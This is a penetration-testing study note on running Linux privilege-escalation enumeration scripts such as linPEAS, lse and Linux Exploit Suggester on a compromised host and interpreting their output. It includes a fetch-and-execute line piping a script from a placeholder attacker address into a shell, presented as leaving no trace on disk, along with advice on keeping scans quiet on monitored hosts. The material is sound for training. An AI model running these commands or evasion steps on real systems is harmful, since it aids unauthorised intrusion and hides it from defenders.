---
type: technique
platform: linux
status: working
fluency: guided
source: thm
updated: 2026-09-04
---

# Linux — Automated Enumeration

The scripted sweep of the whole host, run once you have a shell and know who you are. It produces a **candidate list**, never a conclusion — the Linux counterpart to [[Windows-Automated-Enumeration]]. Run it *after* the by-hand checks in [[Linux-Local-Enumeration]], not before: running it first teaches you nothing and buries the one answer in a thousand lines.

> [!important]
> Every script here reads a **snapshot**: what sits on disk at the second it runs. Anything that exists only while a process is alive — a root cron job, a password on a command line — is invisible to all of them no matter how long you wait. That blind spot is [[PSPY]], and a clean automated run is a negative on disk state only.

## Choosing the tool

The target's environment decides, not preference. `linpeas.sh` needs nothing but a shell; `linuxprivchecker.py` needs Python 3 **on the target**, which a minimal or hardened box may not have. That is the whole reason to be passably familiar with three of these rather than fluent in one.

| Tool | Runtime | Reach for it when |
|---|---|---|
| linPEAS | `sh` | Default. Widest coverage, and the output is ranked by colour instead of dumped flat. |
| LinEnum | `bash` | You want a flat, readable report — system info, users, cron, SUID — instead of the linPEAS wall. |
| lse (Linux Smart Enumeration) | `bash` | linPEAS is too loud. Starts near-silent and reveals more as you raise the level. |
| LES (Linux Exploit Suggester) | `bash` | Configuration paths are dry and the kernel looks old. Matches the kernel against known CVEs — nothing else. |
| linuxprivchecker | `python3` | Second opinion when Python 3 is present. Narrower than the rest; no flags to learn. |

These are the **raw asset** URLs, not the repository pages — fetch each straight onto Kali with `wget`. A repository *page* (`github.com/.../tree/...` or `.../blob/...`) saves as HTML and is exactly the broken download this note warns about below.

<!-- layers-ok -->
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

```bash
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
```

- linPEAS ships a pinned release asset, so `latest/download/` always gives the current build; `linpeas_fat.sh` at the same path bundles every helper for an offline target, `linpeas_small.sh` is the stripped version for a slow link.
- LinEnum, lse and linuxprivchecker are single scripts living on a branch, so their raw form is the `raw.githubusercontent.com/.../master/<file>` URL — the `raw.` host and the branch name are what make it the file rather than the page.
- LES (linux-exploit-suggester) is `https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh`; it reads the target's kernel version and is the Linux twin of WES-NG.

Then serve the directory with `python3 -m http.server 80` and pull onto the target ([[File-Transfer]]).

## Get it on the box and confirm it is intact

**Why now** — you have chosen a tool and it has to arrive before it can run. This step is logistics, but it is also where the whole technique most often fails silently, because a broken download produces an error that reads like a broken tool. The transports themselves are [[File-Transfer]]; the part that belongs here is the check afterwards.

```bash
file /tmp/linpeas.sh
```

```bash
head -1 /tmp/linpeas.sh
```

- `file` → the one check that separates a real script from a saved GitHub *page*. HTML instead of a shell script is the standard trap, and it produces `syntax error near unexpected token '<'` the moment you run it — a message that sends most people debugging the shell rather than the file.
- `head -1` → a shell script starts with `#!/bin/sh` or `#!/bin/bash`. A first line of `<!DOCTYPE html>` is the same failure `file` catches, confirmed a second way.
- fetch the **raw** asset, not the repository page. On GitHub that is the `raw.githubusercontent.com` URL or the release binary, never the `github.com/.../blob/...` link.

**What you will see**

- **Found** — `file` answering `Bourne-Again shell script, ASCII text executable`, and a `head` line beginning `#!`. The script is intact and safe to run.
- **Empty** — a zero-byte file means the transfer completed against nothing: wrong URL, or the server was not serving from the directory that holds the file.
- **Error** — `HTML document text` from `file` is the saved-page trap. `Permission denied` running a script that is present is usually a `noexec` `/tmp` — run it as `sh /tmp/linpeas.sh` to pass the file to the interpreter directly, which sidesteps the mount option.
- **Noise** — `wget` and `curl` print transfer progress that looks like success whether or not the bytes are the ones you wanted. The `file` line is the evidence; the progress bar is not.

**Then** — a verified script goes to its run section below. No egress to fetch it at all goes to [[File-Transfer]], which covers the transports that need no HTTP server.

## Run linPEAS, and keep the transcript

**Why now** — this is the default sweep and the one to run when you have no reason to prefer another. The single decision that matters is made at launch: capture the output, because it is far too long to read as it scrolls and the ranking layer is lost if you pipe it through anything that eats colour.

```bash
./linpeas.sh -a 2>&1 | tee /tmp/.lp.out
```

- `-a` → all checks, including a short process watch and a harder hunt for hashes in files. Slow, and worth it on a box you are not in a hurry on. Drop it with `-s` for the fast, stealthier subset when the host is monitored.
- `tee` → writes a copy to disk while it scrolls past. This is the flag you regret omitting: the output does not fit in a terminal buffer, and re-running the whole sweep to see the top of it is minutes you did not need to spend.
- read it back with `less -r`, not plain `less`. The `-r` preserves the [[Security-Terms#^ansi|ANSI]] colour that carries the entire ranking; without it every highlight is stripped and you are reading an unranked wall.

**What you will see**

- **Found** — lines highlighted red-on-yellow are what the tool rates a probable escalation vector; red alone is suspicious; green is a known-good name the check merely matched. Every highlight is a lead to validate by hand, never a conclusion.
- **Empty** — linPEAS is never genuinely empty. If it produced nothing, it did not run — almost always the saved-page trap from the previous section, or an interpreter mismatch.
- **Error** — `syntax error near unexpected token` with HTML in the message is the saved page. `cannot execute binary file` means you fetched the Windows PEAS or the wrong asset entirely.
- **Noise** — most of the output. The tool cannot see intent, so it flags stock SUID binaries, normal capabilities and default cron timers with the same colours as real findings. The colour is a ranking, not a verdict.

**Then** — every highlight goes to the six questions in [[Linux-Run-Sheet#7 — Automated, as a second opinion|run sheet step 7]]: what privileged component it involves, and what you control about it. A highlight that names a SUID binary goes to [[Linux-SUID-Abuse]]; a capability to [[Linux-Capabilities]]; a writable cron path to [[Cron-Jobs]]. A clean run — no SUID oddity, no writable config, no credential — goes to [[PSPY]], because the one thing linPEAS cannot see is a job that is not on disk.

## When linPEAS is too loud — lse by level

**Why now** — you have decided the host may be watched, and linPEAS announces itself: a recognisable banner, hundreds of file reads, a `find /` across the whole filesystem. `lse` starts near-silent and lets you raise the noise deliberately, one level at a time, stopping as soon as a level pays out.

```bash
./lse.sh -l0 -i
```

- `-l0` → level 0, only what is highly important. An empty level 0 is a real negative on the loudest vectors, not a failure to look hard enough, which is the whole point of starting here.
- `-i` → non-interactive; required when piping or when there is no TTY. Without it `lse` waits for a keypress that a non-interactive shell can never send, and it looks like a hang.
- raise to `-l1` for interesting results and `-l2` for everything, only if the level below came back empty.

**What you will see**

- **Found** — a check marked with a highlighted `yes`. At level 0 there are few of them and each is worth reading in full.
- **Empty** — level 0 finding nothing is a genuine, useful negative: the loud, obvious vectors are closed. It is a reason to raise the level or to switch to [[PSPY]], not a reason to distrust the tool.
- **Error** — a hang with no output is the missing `-i`. `command not found: bash` on a truly minimal image means `lse` cannot run and linPEAS's `sh` compatibility is why it is the default.
- **Noise** — far less than linPEAS by design, which is the reason to reach for it on a monitored host. What noise there is clusters at level 2.

**Then** — a level-0 hit goes to the same technique notes as a linPEAS highlight. An empty sweep across all three levels goes to [[PSPY]] and to the credential hunt, the two things no snapshot tool can close.

## When the kernel looks old — LES

**Why now** — the configuration paths came back dry and the kernel is old enough to be worth a CVE match. [[Security-Terms#^les|LES]] does exactly one thing: it compares a version string against a database of known exploits. It runs nothing on the target and confirms nothing, which is why it sits at the end.

```bash
./linux-exploit-suggester.sh --uname "$(uname -a)"
```

- `--uname "$(uname -a)"` → assess a kernel string you can even copy off the target and run on your own machine; nothing has to execute on the box. Useful when the target cannot run the script at all.
- without arguments it reads the local `uname` and does the same comparison.
- `--checksec` → reports kernel hardening ([[Security-Terms#^kaslr|KASLR]], stack protector) as `[ Enabled ]` / `[ Disabled ]`, which tempers how much faith to put in any suggested exploit.

**What you will see**

- **Found** — entries rated `[ highly probable ]` or `[ probable ]`, each naming a CVE and often a public [[Security-Terms#^poc|PoC]]. That rating is a **version match**, not a working exploit on this host.
- **Empty** — no probable matches is a real negative on the kernel specifically, and a good one: it tells you not to spend time on a kernel path and to stay on configuration and credentials.
- **Error** — nothing worth naming; the script is self-contained and needs only a shell.
- **Noise** — a long tail of `[ less probable ]` entries that match loosely. Distributions backport fixes while keeping the version string, so even a `[ highly probable ]` line very often fails against a patched host.

**Then** — a probable match goes to [[Public-Exploit-Workflow]] to be vetted and compiled before you run it, and kernel exploits sit **last** in [[Linux-Run-Sheet#8 — Stop and connect|the priority order in step 8]] because they crash hosts. A specific candidate is researched from its CVE and vetted there — kernel exploits are one-CVE-one-host affairs, so the vetting method is the durable part and belongs in a workflow note rather than a page per exploit.

## Rarely — worth one command, not worth a step

**Why now** — you cannot write to disk, or writing to disk is what you are trying to avoid on a host that watches for it.

```bash
curl -s http://ATTACKER_IP:8000/linpeas.sh | sh
```

- The script never touches the filesystem: it is read from the socket and fed straight to a shell. Nothing to find afterwards, and nothing to clean up.
- The cost is the transcript. With no file on disk you lose the ability to re-read the output later, so pipe it through `tee` to a path you can write, or accept that one reading is all you get.
- On a host with no outbound route this fails entirely, and that failure is a network finding rather than a scanner problem.

**What you will see**

- **Found** — the scanner's own coloured output, exactly as if it had been run from a file.
- **Empty** — no output at all means the fetch returned nothing and the shell ran an empty script. Check the listener before blaming the target.
- **Error** — `curl: command not found` sends you to [[File-Transfer]] for the shell-only download, which pairs with this line directly.
- **Noise** — the colour codes are unreadable when the output is redirected. Add the scanner's own no-colour flag before piping to a file.

**Then** — the output goes to the reading section below, unchanged. A failed fetch goes to [[File-Transfer]], since the problem is now the channel and not the scanner.

## Reading the output

**Colour is a ranking, not a verdict, and stripping it throws away the point.** In linPEAS, red-on-yellow is roughly 99% a real vector, red alone is suspicious, green is a name match with no claim about contents. Pipe the output through anything that eats escape sequences and you discard the entire ranking layer, which is most of what the tool is for. Save with `tee`, read back with `less -r`.

**A tool match is a lead, not a finding, and this is the discipline the whole note turns on.** Every highlight and every `[ highly probable ]` is a version string or a name the tool recognised; none of them tested anything. A finding becomes a path only once you can name the privileged component and what you control about it — the six questions in [[Linux-Run-Sheet#7 — Automated, as a second opinion|run sheet step 7]].

**A clean run closes disk state and nothing else.** No SUID oddity, no writable config, no credential in a file, and a root cron job could still be firing every minute into a file you can write. An empty automated sweep is precisely the condition that sends you to [[PSPY]], not the condition that ends the engagement.

**These scripts are loud.** Hundreds of file reads, a full-filesystem `find`, and in linPEAS's case a banner a defender's tooling recognises on sight. On anything monitored, prefer the targeted checks in [[Linux-Local-Enumeration]] and reach for the full sweep only once you have decided the noise is affordable.

## Next

- [[PSPY]] — the live half no snapshot tool can see; where a clean run sends you
- [[Linux-Local-Enumeration]] — the by-hand checks these scripts are a faster, louder version of
- [[Linux-Privilege-Escalation]] — the category index every highlight has to land in

## Gaps

- **No worked example.** This is the flag surface only; no box in the vault has been landed *from* a linPEAS highlight in a way that is written up here.
- **No-egress case unaddressed.** The delivery pointer above assumes the target can reach an HTTP server or a listener. Pasting a 400 KB script into a shell is a real situation and neither [[File-Transfer]] nor this note covers it.
- **Lynis and Nessus** are named in [[Linux-Run-Sheet#7 — Automated, as a second opinion|run sheet step 7]] and have no note. Lynis is a defender's audit tool — related instrument, different question.
- Nothing on what a defender sees when one of these runs, beyond "loud".
